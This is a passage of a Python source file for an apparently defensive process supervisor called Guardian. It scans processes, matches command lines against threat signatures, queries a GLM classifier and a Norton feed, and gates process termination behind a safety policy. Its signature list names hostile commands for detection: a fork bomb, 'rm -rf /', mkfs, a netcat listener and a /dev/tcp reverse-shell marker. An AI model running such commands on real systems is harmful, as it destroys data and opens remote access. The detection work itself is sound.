"""Guardian agent — runnable supervisor.

Loads Guardian.yaml, monitors agent processes, detects threats, assesses the
risk of inaction, terminates malicious agents, enforces system protection,
checks for threat-intel updates, and logs everything to the audit trail.

Usage:
    python3 guardian.py                     # run the monitor loop
    python3 guardian.py --once              # single scan cycle and exit
    python3 guardian.py --dry-run           # detect and log without killing
    python3 guardian.py --config FILE       # alternate config file
    python3 guardian.py --glm-test          # score a default probe cmdline via GLM and print Detection JSON
    python3 guardian.py --glm-test CMDLINE  # score CMDLINE via GLM and print Detection JSON
"""

import argparse
import hashlib
import json
import os
import re
import shlex
import signal
import subprocess
import sys
import time
import urllib.error
import urllib.request
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Optional

import yaml

from guardian_audit import log_action

CONFIG_PATH = Path("Guardian.yaml")
RISK_ORDER = ("low", "medium", "high", "critical")

# Sensitive paths the guardian protects from modification by managed agents.
SENSITIVE_PATHS = ("/etc", "/bin", "/sbin", "/usr/bin", "/boot", str(Path.home() / ".ssh"))

# Where applied updates are snapshotted for rollback_on_failure.
BACKUP_DIR = Path("backups")

# Where incoming updates land for the automatic check_updates() sweep.
DEFAULT_UPDATES_INBOX = Path("updates/inbox")

_INTERVAL_UNITS = {"s": 1, "m": 60, "h": 3600, "d": 86400}


def parse_interval(value: Any, default: float = 60.0) -> float:
    """Parse a duration like 45m, 30s, 1h, 2d (or plain seconds) into seconds."""
    if isinstance(value, (int, float)):
        return float(value)
    text = str(value).strip().lower()
    if text and text[-1] in _INTERVAL_UNITS and text[:-1].isdigit():
        return float(text[:-1]) * _INTERVAL_UNITS[text[-1]]
    try:
        return float(text)
    except ValueError:
        return default


def send_alert(message: str, *, risk_level: Optional[str] = None,
               agent_id: Optional[str] = None, **details: Any) -> None:
    """Alert hook for high-risk escalations.

    Default implementation prints to stderr and writes an ``escalation``
    audit entry. Swap in email/webhook/Slack delivery for production.
    """
    print(f"GUARDIAN ALERT [{risk_level}]: {message}", file=sys.stderr)
    log_action("escalation", f"ALERT: {message}", agent_id=agent_id,
               risk_level=risk_level, details=details or None)


class SafetyPolicy:
    """Prime directive gate: always protect, never harm.

    Moral model: Superman-style restraint — protect the innocent, use the
    least force necessary, act only with evidence, remain accountable for
    every action, and refuse anything outside the protective mission.
    """

    ALLOWED_WRITE_ROOTS = ("quarantine", "backups", "threat_signatures.json")

    def __init__(self, config: "Config") -> None:
        self.config = config

    def section(self) -> dict[str, Any]:
        return self.config.section("core_directives")

    def enabled(self) -> bool:
        return bool(self.section().get("protect_only", True))

    def principles(self) -> list[str]:
        raw = self.section().get("principles", [])
        return list(raw) if isinstance(raw, list) else []

    def _refuse(self, action: str, reason: str, **details: Any) -> bool:
        log_action("protection", f"SAFETY REFUSAL: {action} blocked — {reason}",
                   details={"directive": self.section().get("prime_directive", ""),
                            "moral_model": self.section().get("moral_model", ""),
                            "blocked_action": action, "reason": reason, **details})
        return False

    def authorize_termination(self, proc: "AgentProcess", *, scan_pattern: str,
                              detection: Optional["Detection"],
                              risk: Optional[str] = None) -> bool:
        """A termination is allowed only if defensive, justified, and in scope."""
        if not self.enabled():
            return True
        if detection is None and self.section().get("require_defensive_justification", True):
            return self._refuse("terminate", "no detection justifies this action",
                                pid=proc.pid, name=proc.name)
        if self.section().get("scope_limited", True):
            if scan_pattern.lower() not in proc.cmdline.lower():
                return self._refuse("terminate", "process is outside managed scope",
                                    pid=proc.pid, name=proc.name, pattern=scan_pattern)
            if "guardian" in proc.cmdline.lower():
                return self._refuse("terminate", "refusing to harm a guardian process (self or sibling)",
                                    pid=proc.pid, name=proc.name)
        if "least_force_first" in self.principles() and risk is not None:
            # Least-force principle: termination requires high or critical risk;
            # lower severities are handled with monitoring and alerts only.
            if RISK_ORDER.index(risk) < RISK_ORDER.index("high"):
                return self._refuse("terminate", "least-force principle: risk below high does not justify termination",
                                    pid=proc.pid, name=proc.name, risk=risk)
        return True

    def authorize_write(self, path: Path) -> bool:
        """Writes are allowed only to defensive artifacts (quarantine, backups, signature DB)."""
        if not self.enabled() or not self.section().get("never_modify_system_files", True):
            return True
        normalized = str(path)
        for sensitive in SENSITIVE_PATHS:
            if normalized.startswith(sensitive):
                return self._refuse("write", "path is a protected system location", path=normalized)
        if any(normalized.startswith(root) for root in self.ALLOWED_WRITE_ROOTS):
            return True
        return self._refuse("write", "path is outside allowed defensive artifacts", path=normalized)

# Suspicious commands/patterns used by the signature-based detector.
DEFAULT_SIGNATURES = (
    "rm -rf /",
    "mkfs",
    ":(){ :|:& };:",  # fork bomb
    "nc -l",  # netcat listener
    "/dev/tcp/",  # bash reverse shell
    "base64 -d",
    "chmod 777 /",
    # curl/wget alone are weak signals (common benign admin tools); they stay in
    # the signature list to flag download activity, but the high-severity
    # detection is the download-piped-to-shell pattern in behavioral_scan().
    "curl",
    "wget",
)


# --------------------------------------------------------------------------
# Config
# --------------------------------------------------------------------------

@dataclass
class Config:
    raw: dict[str, Any]

    @classmethod
    def load(cls, path: Path = CONFIG_PATH) -> "Config":
        with path.open(encoding="utf-8") as f:
            return cls(yaml.safe_load(f))

    @property
    def guardian(self) -> dict[str, Any]:
        return self.raw.get("guardian_agent", {})

    @property
    def updates(self) -> dict[str, Any]:
        return self.raw.get("updates", {})

    @property
    def enabled(self) -> bool:
        return bool(self.guardian.get("enabled", False))

    def section(self, name: str) -> dict[str, Any]:
        return self.guardian.get(name, {})

    def risk_at_least(self, level: str, threshold: str) -> bool:
        return RISK_ORDER.index(level) >= RISK_ORDER.index(threshold)


# --------------------------------------------------------------------------
# Monitoring
# --------------------------------------------------------------------------

@dataclass
class AgentProcess:
    pid: int
    name: str
    cmdline: str

    @classmethod
    def scan(cls, pattern: str = "agent") -> list["AgentProcess"]:
        """Find running processes whose command line matches a pattern."""
        try:
            out = subprocess.run(
                ["ps", "-eo", "pid=,comm=,args="],
                capture_output=True, text=True, check=True, timeout=10,
            ).stdout
        except (subprocess.SubprocessError, FileNotFoundError):
            return []
        procs = []
        pattern_l = pattern.lower()
        for line in out.splitlines()[1:]:
            parts = line.split(None, 2)
            if len(parts) < 3:
                continue
            pid_s, name, cmdline = parts
            cmdline_l = cmdline.lower()
            if pattern_l in cmdline_l and "guardian" not in cmdline_l:
                try:
                    procs.append(cls(pid=int(pid_s), name=name, cmdline=cmdline))
                except ValueError:
                    continue
        return procs


# --------------------------------------------------------------------------
# Threat detection
# --------------------------------------------------------------------------

@dataclass
class Detection:
    algorithm: str
    description: str
    matched: str
    base_risk: str  # risk assigned by the detector before inaction assessment


def load_signatures(db_path: Path = Path("threat_signatures.json")) -> list[str]:
    """Load signature DB (threat intel); fall back to built-in defaults."""
    if db_path.exists():
        try:
            data = json.loads(db_path.read_text(encoding="utf-8"))
            sigs = data.get("signatures", [])
            if sigs:
                return list(sigs)
        except (json.JSONDecodeError, AttributeError):
            pass
    return list(DEFAULT_SIGNATURES)


def load_norton_signatures(config: Config) -> list[str]:
    """Load Norton signatures from local JSON export."""
    norton = _norton_config(config)
    if not norton.get("enabled", False):
        return []
    feed_path = Path(str(norton.get("signature_feed", "norton_signatures.json")))
    return _load_norton_signature_file(feed_path, norton)


def _norton_config(config: Config) -> dict[str, Any]:
    integrations = config.raw.get("integrations", {})
    return integrations.get("norton", {}) if isinstance(integrations, dict) else {}


def _glm_config(config: Config) -> dict[str, Any]:
    """Return the ``integrations.glm`` block from config, or empty dict.

    Keys: enabled, model, endpoint, api_key_env, timeout_seconds,
    min_confidence, fallback_to_heuristic.
    """
    integrations = config.raw.get("integrations", {})
    return integrations.get("glm", {}) if isinstance(integrations, dict) else {}


def _load_norton_signature_file(feed_path: Path, norton: dict[str, Any]) -> list[str]:
    if not feed_path.exists():
        log_action("update", "Norton signature feed not found",
                   details={"integration": "norton", "path": str(feed_path)})
        return []
    try:
        data = json.loads(feed_path.read_text(encoding="utf-8"))
    except json.JSONDecodeError:
        log_action("update", "Norton signature feed is not valid JSON",
                   details={"integration": "norton", "path": str(feed_path)})
        return []

    raw_sigs: list[str] = []
    if isinstance(data, list):
        raw_sigs = [s for s in data if isinstance(s, str)]
    elif isinstance(data, dict):
        keys = norton.get("signature_keys", ["signatures", "indicators", "commands"])
        for key in keys:
            values = data.get(key, []) if isinstance(key, str) else []
            if isinstance(values, list):
                raw_sigs.extend(s for s in values if isinstance(s, str))

    signatures = [s.strip() for s in raw_sigs if s.strip()]
    unique_signatures = list(dict.fromkeys(signatures))
    log_action("update", f"Loaded Norton signatures ({len(unique_signatures)})",
               details={"integration": "norton", "path": str(feed_path)})
    return unique_signatures


def _norton_live_config(norton: dict[str, Any]) -> dict[str, Any]:
    live = norton.get("live", {})
    return live if isinstance(live, dict) else {}


def _http_get_json(request: urllib.request.Request, timeout_seconds: float) -> Any:
    with urllib.request.urlopen(request, timeout=timeout_seconds) as response:
        return json.loads(response.read().decode("utf-8"))


def _retry_delay_seconds(e: Exception, attempt: int, retry_backoff_seconds: float,
                         max_retry_after_seconds: float) -> float:
    delay = retry_backoff_seconds * (attempt + 1)
    if isinstance(e, urllib.error.HTTPError) and e.code == 429:
        retry_after = e.headers.get("Retry-After") if e.headers else None
        if retry_after:
            try:
                return min(float(retry_after), max_retry_after_seconds)
            except ValueError:
                pass
    return delay


def check_norton_device_compatibility(norton: dict[str, Any]) -> bool:
    """Check Norton compatibility endpoint; returns False if device is unsupported."""
    return bool(diagnose_norton_compatibility(norton).get("compatible", True))


def diagnose_norton_compatibility(norton: dict[str, Any]) -> dict[str, Any]:
    """Return detailed Norton compatibility diagnostics for operator troubleshooting."""
    live = _norton_live_config(norton)
    endpoint = str(live.get("compatibility_endpoint", "")).strip()
    api_key_env = str(live.get("api_key_env", "NORTON_API_KEY")).strip() or "NORTON_API_KEY"
    api_key = os.environ.get(api_key_env, "").strip()
    timeout_seconds = float(live.get("timeout_seconds", 8))

    if not endpoint:
        return {
            "compatible": True,
            "reason": "compatibility endpoint not configured",
            "endpoint": endpoint,
            "api_key_env": api_key_env,
            "has_api_key": bool(api_key),
        }
    if not api_key:
        return {
            "compatible": True,
            "reason": "api key missing; compatibility check skipped",
            "endpoint": endpoint,
            "api_key_env": api_key_env,
            "has_api_key": False,
        }

    request = urllib.request.Request(endpoint, headers={
        "Authorization": f"Bearer {api_key}",
        "Accept": "application/json",
        "User-Agent": "Daigrin-Guardian/1.0",
    })
    try:
        payload = _http_get_json(request, timeout_seconds)
    except (urllib.error.URLError, TimeoutError, json.JSONDecodeError) as e:
        return {
            "compatible": True,
            "reason": f"compatibility check request failed: {e}",
            "endpoint": endpoint,
            "api_key_env": api_key_env,
            "has_api_key": True,
        }

    message = ""
    compatible = True
    if isinstance(payload, dict):
        if isinstance(payload.get("compatible"), bool):
            compatible = payload["compatible"]
        message = str(payload.get("message") or payload.get("error") or "")
    if "no compatible agents on your device" in message.lower():
        compatible = False
        if not message:
            message = "No compatible agents on your device"

    return {
        "compatible": compatible,
        "reason": message or ("compatible" if compatible else "incompatible"),
        "endpoint": endpoint,
        "api_key_env": api_key_env,
        "has_api_key": True,
        "raw": payload,
    }


def fetch_norton_signatures_live(norton: dict[str, Any]) -> list[str]:
    """Fetch Norton signatures from API endpoint with retries."""
    live = _norton_live_config(norton)
    endpoint = str(live.get("endpoint", "")).strip()
    api_key_env = str(live.get("api_key_env", "NORTON_API_KEY")).strip() or "NORTON_API_KEY"
    api_key = os.environ.get(api_key_env, "").strip()
    timeout_seconds = float(live.get("timeout_seconds", 8))
    retries = int(live.get("retries", 2))
    retry_backoff_seconds = float(live.get("retry_backoff_seconds", 1))
    max_retry_after_seconds = float(live.get("max_retry_after_seconds", 120))
    fail_open = bool(live.get("fail_open", False))
    auto_fallback_on_incompatible = bool(live.get("auto_fallback_on_incompatible", True))
    cache_path = Path(str(live.get("cache_file", "norton_signatures.cache.json")))
    local_fallback_path = Path(str(norton.get("signature_feed", "norton_signatures.json")))

    if not endpoint:
        log_action("update", "Norton live endpoint not configured",
                   details={"integration": "norton", "mode": "live"})
        return _load_norton_signature_file(local_fallback_path, norton)
    if not api_key:
        log_action("update", "Norton API key missing; using fallback signatures",
                   details={"integration": "norton", "mode": "live",
                            "api_key_env": api_key_env})
        return _norton_live_fallback(cache_path, local_fallback_path, norton)

    if auto_fallback_on_incompatible and not check_norton_device_compatibility(norton):
        log_action("update", "Norton live fetch skipped: device compatibility check failed",
                   details={"integration": "norton", "mode": "live",
                            "reason": "no compatible agents on device"})
        return _norton_live_fallback(cache_path, local_fallback_path, norton)

    request = urllib.request.Request(endpoint, headers={
        "Authorization": f"Bearer {api_key}",
        "Accept": "application/json",
        "User-Agent": "Daigrin-Guardian/1.0",
    })

    for attempt in range(retries + 1):
        try:
            data = _http_get_json(request, timeout_seconds)
            raw = data if isinstance(data, list) else data.get("signatures", []) if isinstance(data, dict) else []
            signatures = [s.strip() for s in raw if isinstance(s, str) and s.strip()]
            unique_signatures = list(dict.fromkeys(signatures))
            cache_path.write_text(json.dumps(unique_signatures), encoding="utf-8")
            log_action("update", f"Fetched Norton live signatures ({len(unique_signatures)})",
                       details={"integration": "norton", "mode": "live",
                                "attempts": attempt + 1, "cache_file": str(cache_path)})
            return unique_signatures
        except (urllib.error.URLError, TimeoutError, json.JSONDecodeError) as e:
            if attempt < retries:
                time.sleep(_retry_delay_seconds(e, attempt, retry_backoff_seconds, max_retry_after_seconds))
            else:
                if isinstance(e, urllib.error.HTTPError) and e.code == 429:
                    log_action("update", "Norton live fetch rate-limited (HTTP 429)",
                               details={"integration": "norton", "mode": "live",
                                        "attempts": retries + 1,
                                        "retry_after": e.headers.get("Retry-After") if e.headers else None})
                else:
                    log_action("update", f"Norton live fetch failed: {e}",
                               details={"integration": "norton", "mode": "live",
                                        "attempts": retries + 1, "fail_open": fail_open})

    return _norton_live_fallback(cache_path, local_fallback_path, norton)


def _norton_live_fallback(cache_path: Path, local_fallback_path: Path,
                          norton: dict[str, Any]) -> list[str]:
    cached = _load_norton_signature_file(cache_path, norton)
    if cached:
        return cached
    return _load_norton_signature_file(local_fallback_path, norton)


def resolve_norton_signatures(config: Config, mode_override: Optional[str] = None) -> list[str]:
    """Resolve Norton signatures using configured mode (local/live)."""
    norton = _norton_config(config)
    if not norton.get("enabled", False):
        return []
    mode = str(mode_override or norton.get("mode", "local")).strip().lower()
    if mode == "live":
        return fetch_norton_signatures_live(norton)
    return load_norton_signatures(config)


def signature_scan(proc: AgentProcess, signatures: list[str]) -> Optional[Detection]:
    """Signature-based detection: match command line against known-bad patterns."""
    for sig in signatures:
        if sig in proc.cmdline:
            return Detection("signature_based", f"Command matches known-bad signature: {sig!r}", sig, "high")
    return None


def anomaly_scan(proc: AgentProcess) -> Optional[Detection]:
    """Anomaly-based detection: statistical outliers in process behavior.

    Flags abnormally long argument lists (often obfuscated payloads).
    """
    try:
        argc = len(shlex.split(proc.cmdline))
    except ValueError:
        return Detection("anomaly_based", "Unparseable/obfuscated command line", proc.cmdline[:80], "medium")
    if argc > 50:
        return Detection("anomaly_based", f"Abnormal argument count ({argc})", proc.cmdline[:80], "medium")
    return None


def behavioral_scan(proc: AgentProcess) -> Optional[Detection]:
    """Behavioral detection: touches sensitive paths or shell-pipe patterns."""
    for path in SENSITIVE_PATHS:
        if path in proc.cmdline and any(w in proc.cmdline for w in ("rm", "mv", "chmod", "chown", ">", "dd")):
            return Detection("behavioral_based", f"Modifies sensitive path {path}", proc.cmdline[:80], "high")
    if ("curl" in proc.cmdline or "wget" in proc.cmdline) and ("| sh" in proc.cmdline or "|sh" in proc.cmdline or "| bash" in proc.cmdline):
        return Detection("behavioral_based", "Download piped directly to shell", proc.cmdline[:80], "critical")
    return None


def _ml_heuristic_scan(proc: AgentProcess) -> Optional[Detection]:
    """Built-in ML heuristic: high token entropy / heavy encoding is suspicious."""
    encoded_markers = sum(proc.cmdline.count(m) for m in ("base64", "eval", "exec", "fromhex", "\\x"))
    if encoded_markers >= 2:
        return Detection("machine_learning", f"Heuristic score high ({encoded_markers} obfuscation markers)", proc.cmdline[:80], "medium")
    return None


def ml_scan(proc: AgentProcess) -> Optional[Detection]:
    """ML-based detection placeholder.

    A real deployment would score cmdline features with a trained model.
    Heuristic stand-in: high token entropy / heavy encoding is suspicious.
    """
    return _ml_heuristic_scan(proc)


_GLM_SYSTEM_PROMPT = (
    "You are a read-only security classifier for a defensive AI supervisor. "
    "You never execute any commands. "
    "Analyze the command line provided by the user and reply with ONLY a JSON object "
    "in the form: {\"malicious\": <bool>, \"confidence\": <float 0-1>, \"reason\": <str>} "
    "indicating whether the command line is malicious. Do not include any other text."
)


def glm_scan(proc: AgentProcess, glm_cfg: dict[str, Any]) -> Optional[Detection]:
    """Score a process command line using the GLM API (opt-in ML detector).

    Reads config keys from ``glm_cfg`` (see ``_glm_config``):
      enabled, model, endpoint, api_key_env, timeout_seconds,
      min_confidence, fallback_to_heuristic.

    Returns a Detection when GLM reports malicious with confidence >=
    min_confidence, or falls back to the built-in heuristic on any error
    (when fallback_to_heuristic is true).  Returns None when disabled.
    """
    if not glm_cfg.get("enabled"):
        return None

    model = str(glm_cfg.get("model", "glm-4.6"))
    endpoint = str(glm_cfg.get("endpoint", "https://open.bigmodel.cn/api/paas/v4/chat/completions"))
    api_key_env = str(glm_cfg.get("api_key_env", "GLM_API_KEY"))
    timeout_seconds = float(glm_cfg.get("timeout_seconds", 8))
    min_confidence = float(glm_cfg.get("min_confidence", 0.8))
    fallback = bool(glm_cfg.get("fallback_to_heuristic", True))

    api_key = os.environ.get(api_key_env)
    if not api_key:
        log_action("update", "GLM API key missing; using heuristic fallback",
                   details={"integration": "glm", "api_key_env": api_key_env})
        return _ml_heuristic_scan(proc) if fallback else None

    body = json.dumps({
        "model": model,
        "messages": [
            {"role": "system", "content": _GLM_SYSTEM_PROMPT},
            {"role": "user", "content": proc.cmdline},
        ],
        "temperature": 0,
    }).encode("utf-8")

    req = urllib.request.Request(
        endpoint,
        data=body,
        headers={
            "Content-Type": "application/json",
            "User-Agent": "Daigrin-Guardian/1.0",
        },
        method="POST",
    )
    req.add_header("Authorization", "Bearer " + api_key)

    t0 = time.monotonic()
    try:
        with urllib.request.urlopen(req, timeout=timeout_seconds) as resp:
            raw = resp.read().decode("utf-8")
        latency_ms = int((time.monotonic() - t0) * 1000)

        data = json.loads(raw)
        content = data["choices"][0]["message"]["content"]

        # Tolerate code-fence wrappers: extract first {...} block
        m = re.search(r"\{.*?\}", content, re.DOTALL)
        if not m:
            raise ValueError(f"No JSON object found in GLM response: {content!r}")
        result = json.loads(m.group())

        malicious = bool(result.get("malicious", False))
        confidence = float(result.get("confidence", 0.0))
        reason = str(result.get("reason", ""))

        log_action("detection", f"GLM scoring: malicious={malicious} confidence={confidence:.2f}",
                   details={"integration": "glm", "model": model,
                            "confidence": confidence, "latency_ms": latency_ms,
                            "cmdline": proc.cmdline[:80]})

        if malicious and confidence >= min_confidence:
            return Detection(
                "machine_learning",
                f"GLM {model}: {reason} (confidence {confidence:.2f})",
                proc.cmdline[:80],
                "medium",
            )
        return None

    except (urllib.error.URLError, TimeoutError, json.JSONDecodeError, KeyError, IndexError, ValueError) as e:
        latency_ms = int((time.monotonic() - t0) * 1000)
        log_action("detection", f"GLM scoring failed: {e}",
                   details={"integration": "glm", "model": model,
                            "latency_ms": latency_ms, "cmdline": proc.cmdline[:80]})
        return _ml_heuristic_scan(proc) if fallback else None


DETECTORS = {
    "signature_based": signature_scan,
    "anomaly_based": anomaly_scan,
    "behavioral_based": behavioral_scan,
    "machine_learning": ml_scan,
}


class AdaptiveLearner:
    """Learn new defensive signatures from observed high-risk behavior."""

    def __init__(self, config: Config, signature_db_path: Path = Path("threat_signatures.json")) -> None:
        self.config = config
        self.signature_db_path = signature_db_path

    def enabled(self) -> bool:
        section = self.config.section("adaptive_learning")
        return bool(section.get("enabled", False) and section.get("learn_from_detections", False))

    def absorb(self, detections: list[Detection]) -> list[str]:
        if not self.enabled() or not detections:
            return []
        section = self.config.section("adaptive_learning")
        if not section.get("update_signatures_from_high_risk", False):
            return []
        max_new = int(section.get("max_new_signatures_per_cycle", 5))
        learned: list[str] = []
        for det in detections:
            if det.base_risk not in ("high", "critical"):
                continue
            token = det.matched.strip()
            if not token or len(token) > 200:
                continue
            learned.append(token)
        learned = list(dict.fromkeys(learned))[:max_new]
        if not learned:
            return []

        existing = set(load_signatures(self.signature_db_path))
        merged = sorted(existing | set(learned))
        payload = {"signatures": merged}
        if not SafetyPolicy(self.config).authorize_write(self.signature_db_path):
            return []
        self.signature_db_path.write_text(json.dumps(payload, indent=2), encoding="utf-8")
        log_action("update", f"Adaptive learning absorbed {len(learned)} new signature(s)",
                   details={"learned": learned, "signature_db": str(self.signature_db_path)})
        return learned


class SelfScaler:
    """Split the guardian into bounded spawn processes when workload spikes."""

    def __init__(self, config: Config) -> None:
        self.config = config
        self.active_spawns: list[subprocess.Popen] = []
        self.cooldown_left = 0

    def section(self) -> dict[str, Any]:
        return self.config.section("self_scaling")

    def enabled(self) -> bool:
        return bool(self.section().get("enabled", False))

    def maybe_split(self, threat_count: int, *, scan_pattern: str, dry_run: bool) -> int:
        if not self.enabled():
            return 0
        section = self.section()
        threshold = int(section.get("split_threshold", 3))
        max_agents = int(section.get("max_agents", 8))
        min_agents = int(section.get("min_agents", 1))
        cooldown_cycles = int(section.get("cooldown_cycles", 2))

        self.active_spawns = [p for p in self.active_spawns if p.poll() is None]
        if self.cooldown_left > 0:
            self.cooldown_left -= 1
            return 0
        if threat_count < threshold:
            return 0

        desired_total = min(max_agents, max(min_agents, threat_count))
        spawn_count = max(0, desired_total - (1 + len(self.active_spawns)))
        if spawn_count <= 0:
            return 0

        spawned = 0
        for _ in range(spawn_count):
            cmd = [sys.executable, "guardian.py", "--once", "--pattern", scan_pattern]
            if dry_run:
                cmd.append("--dry-run")
            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self.active_spawns.append(proc)
            spawned += 1

        self.cooldown_left = cooldown_cycles
        log_action("escalation", f"Self-scaling spawned {spawned} guardian spawn(s)",
                   details={"active_spawns": len(self.active_spawns),
                            "threat_count": threat_count, "threshold": threshold})
        return spawned


# --------------------------------------------------------------------------
# Remediation advisory (defensive: advise, never modify third-party software)
# --------------------------------------------------------------------------

# Advisory severities reuse the audit trail's risk levels.
ADVISORY_SEVERITIES = RISK_ORDER

# Product-name marker used to extract a version token from a cmdline.
# "productX" style matches are checked for "<match><digits...>" (e.g. "agent2"
# in "agent2.3 --run"); plain words are checked for "<match>-<digits...>" and
# "<match> <digits...>" forms (e.g. "logsvc-1.2.3", "logsvc 1.2.3").
_VERSION_RE = re.compile(r"\d+(?:\.\d+){0,3}")


@dataclass
class RemediationAdvisory:
    """A known-vulnerability advisory matched against a managed process.

    Advisory-only by design: it is never fed to termination or used to modify
    the affected software. The response is an operator alert + audit entry.
    """
    advisory_id: str
    severity: str
    product: str       # cmdline substring that identified the software
    matched: str       # version token found in the cmdline ("" if none)
    fixed_version: str # first version carrying the fix ("" if unknown)
    recommendation: str


def _advisory_config(config: Config) -> dict[str, Any]:
    section = config.section("remediation_advisory")
    return section if isinstance(section, dict) else {}


# run_cycle() calls load_advisories() every scan cycle, so parsed feeds are
# memoized on (path, min_severity) and re-read only when the file's mtime
# changes. Missing feeds cache as empty too: the audit entry is written once
# per actual (re)load attempt, not once per cycle.
_ADVISORY_FEED_CACHE: dict[tuple[str, str], tuple[int, list[dict[str, Any]]]] = {}


def load_advisories(feed_path: Path, *, min_severity: str = "low") -> list[dict[str, Any]]:
    """Load the vendor-neutral advisory DB; invalid data degrades to none.

    Feed format: {"advisories": [{"id", "severity", "match", ...}, ...]}.
    Entries missing id/match or with an unknown severity are skipped. A
    missing or unparseable feed is an audit-logged non-event, never an error —
    advisories must never degrade the monitoring mission.

    Results are cached and reloaded only when the feed file's mtime changes,
    so the per-cycle call in run_cycle() costs one stat() instead of a full
    read + parse + audit entry.
    """
    key = (str(feed_path), min_severity)
    try:
        mtime_ns = feed_path.stat().st_mtime_ns
    except OSError:
        mtime_ns = -1  # missing/unreadable: cached as the empty feed
    cached = _ADVISORY_FEED_CACHE.get(key)
    if cached is not None and cached[0] == mtime_ns:
        return list(cached[1])
    advisories = _parse_advisories(feed_path, min_severity=min_severity)
    _ADVISORY_FEED_CACHE[key] = (mtime_ns, advisories)
    return list(advisories)


def _parse_advisories(feed_path: Path, *, min_severity: str) -> list[dict[str, Any]]:
    if not feed_path.exists():
        log_action("update", "Advisory feed not found",
                   details={"path": str(feed_path)})
        return []
    try:
        data = json.loads(feed_path.read_text(encoding="utf-8"))
    except json.JSONDecodeError:
        log_action("update", "Advisory feed is not valid JSON",
                   details={"path": str(feed_path)})
        return []
    raw = data.get("advisories", []) if isinstance(data, dict) else []
    if not isinstance(raw, list):
        raw = []
    floor = ADVISORY_SEVERITIES.index(min_severity) if min_severity in ADVISORY_SEVERITIES else 0
    advisories = []
    for entry in raw:
        if not isinstance(entry, dict):
            continue
        adv_id = str(entry.get("id", "")).strip()
        match = str(entry.get("match", "")).strip()
        severity = str(entry.get("severity", "low")).strip().lower()
        if not adv_id or not match or severity not in ADVISORY_SEVERITIES:
            continue
        if ADVISORY_SEVERITIES.index(severity) < floor:
            continue
        advisories.append({
            "id": adv_id,
            "severity": severity,
            "match": match,
            "summary": str(entry.get("summary", "")),
            "affected_below": str(entry.get("affected_below", "")).strip(),
            "fixed_version": str(entry.get("fixed_version", "")).strip(),
            "recommendation": str(entry.get("recommendation", "")),
        })
    log_action("update", f"Loaded advisories ({len(advisories)})",
               details={"path": str(feed_path), "min_severity": min_severity})
    return advisories


def version_below(found: str, boundary: str) -> bool:
    """True if version string `found` is lower than `boundary` (numeric, dotted).

    Unparseable or empty inputs never claim "vulnerable" — restraint over noise.
    """
    def parts(v: str) -> Optional[list[int]]:
        v = v.strip()
        if not v or not _VERSION_RE.fullmatch(v):
            return None
        return [int(p) for p in v.split(".")]
    f, b = parts(found), parts(boundary)
    if f is None or b is None:
        return False
    length = max(len(f), len(b))
    f += [0] * (length - len(f))
    b += [0] * (length - len(b))
    return f < b


def _extract_version(cmdline: str, match: str) -> str:
    """Extract the version token associated with a product match in a cmdline."""
    if not match:
        return ""
    compact = match.replace(" ", "")
    token_re = r"[A-Za-z0-9_+~.-]*"
    m = re.search(re.escape(compact) + token_re, cmdline.replace(" ", ""))
    if not m:
        return ""
    ver = _VERSION_RE.search(m.group(0))
    return ver.group(0) if ver else ""


def advisory_scan(proc: AgentProcess, advisories: list[dict[str, Any]]) -> list[RemediationAdvisory]:
    """Match a managed process against the advisory DB (read-only).

    An advisory applies when its `match` string appears in the cmdline AND its
    version gate holds: with `affected_below` set, the version extracted from
    the cmdline must be below it; without it, the match alone is enough.
    """
    results = []
    for adv in advisories:
        match = adv["match"]
        if match.lower() not in proc.cmdline.lower():
            continue
        found_version = _extract_version(proc.cmdline, match)
        gate = adv["affected_below"]
        if gate and not version_below(found_version, gate):
            continue
        results.append(RemediationAdvisory(
            advisory_id=adv["id"], severity=adv["severity"], product=match,
            matched=found_version, fixed_version=adv["fixed_version"],
            recommendation=adv["recommendation"] or adv["summary"]))
    return results


def advise_remediation(proc: AgentProcess, advisories: list[RemediationAdvisory],
                       config: Config, advised: set[tuple[int, str]]) -> int:
    """Alert + audit-log matched advisories. Never acts on the process itself."""
    cfg = _advisory_config(config)
    count = 0
    for adv in advisories:
        key = (proc.pid, adv.advisory_id)
        if key in advised:
            continue
        advised.add(key)
        count += 1
        fix = (f"; update to >= {adv.fixed_version}" if adv.fixed_version else "")
        message = (f"Remediation advisory {adv.advisory_id} [{adv.severity}]: "
                   f"PID {proc.pid} ({proc.name}) runs known-vulnerable "
                   f"{adv.product}{(' ' + adv.matched) if adv.matched else ''}{fix}. "
                   f"{adv.recommendation}".strip())
        log_action("escalation", message, agent_id=str(proc.pid), risk_level=adv.severity,
                   details={"advisory_id": adv.advisory_id, "product": adv.product,
                            "matched_version": adv.matched,
                            "fixed_version": adv.fixed_version,
                            "recommendation": adv.recommendation,
                            "action": "advisory_only"})
        if cfg.get("alert_on_advisory", True):
            send_alert(message, risk_level=adv.severity, agent_id=str(proc.pid),
                       advisory_id=adv.advisory_id)
    return count


def detect_threats(proc: AgentProcess, config: Config, signatures: list[str]) -> list[Detection]:
    """Run all enabled detection algorithms against one process."""
    td = config.section("threat_detection")
    if not td.get("enabled", False):
        return []
    findings = []
    for algo in td.get("algorithms", []):
        detector = DETECTORS.get(algo)
        if detector is None:
            continue
        if algo == "machine_learning":
            glm_cfg = _glm_config(config)
            result = glm_scan(proc, glm_cfg) if glm_cfg.get("enabled") else ml_scan(proc)
        elif detector is signature_scan:
            result = detector(proc, signatures)
        else:
            result = detector(proc)
        if result:
            findings.append(result)
    return findings


# --------------------------------------------------------------------------
# Risk assessment (risk of doing nothing)
# --------------------------------------------------------------------------

def assess_inaction_risk(det: Detection, config: Config) -> str:
    """Escalate the detector's base risk based on what inaction would allow."""
    ra = config.section("risk_assessment")
    if not ra.get("assess_inaction_risk", False):
        return det.base_risk
    # Download-to-shell and sensitive-path modification leave no room to wait.
    if det.algorithm == "behavioral_based":
        return "critical" if "shell" in det.description else "high"
    # Signature matches are known-bad: inaction risk is high.
    if det.algorithm == "signature_based":
        return "high"
    return det.base_risk


# --------------------------------------------------------------------------
# Termination & protection
# --------------------------------------------------------------------------

def terminate_agent(proc: AgentProcess, risk: str, config: Config, *, dry_run: bool = False,
                    detection: Optional[Detection] = None,
                    safety: Optional[SafetyPolicy] = None,
                    scan_pattern: str = "agent") -> bool:
    """Terminate a malicious agent process, honoring safety policy + confirmation."""
    policy = safety or SafetyPolicy(config)
    if not policy.authorize_termination(proc, scan_pattern=scan_pattern,
